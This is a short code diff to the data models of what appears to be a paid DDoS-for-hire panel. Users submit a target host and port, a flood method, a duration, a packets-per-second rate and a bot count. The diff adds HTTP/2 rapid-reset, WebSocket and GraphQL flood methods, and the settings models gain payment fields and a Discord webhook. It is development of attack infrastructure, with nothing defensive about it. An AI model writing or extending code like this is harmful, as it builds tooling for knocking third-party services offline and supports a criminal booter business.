@@ -90,7 +90,7 @@ class BotThrottle(BaseModel):
 class AttackCreate(BaseModel):
     target_host: str
     target_port: int = Field(..., ge=1, le=65535)
-    method: str = Field(default="MEGA", pattern="^(MEGA|UDP|TLS_EXHAUST|HTTP|SLOWLORIS|HTTP_PROXY|GAME)$")
+    method: str = Field(default="MEGA", pattern="^(MEGA|UDP|TLS_EXHAUST|HTTP|SLOWLORIS|HTTP_PROXY|GAME|H2RAPID|WSFLOOD|GRAPHQL)$")
     duration_secs: int = Field(default=60, ge=1, le=3600)
     pps_per_bot: int = Field(default=100000, ge=1, le=100000000)
     bot_count: int = Field(default=1, ge=1, le=100)
@@ -207,6 +207,7 @@ class SettingsUpdate(BaseModel):
     bank_bin: Optional[str] = None
     min_deposit: Optional[int] = None
     maintenance_mode: Optional[bool] = None
+    discord_webhook_url: Optional[str] = None
 
 class SettingsOut(BaseModel):
     site_name: str
@@ -218,3 +219,4 @@ class SettingsOut(BaseModel):
     bank_bin: str
     min_deposit: int
     maintenance_mode: bool
+    discord_webhook_url: str
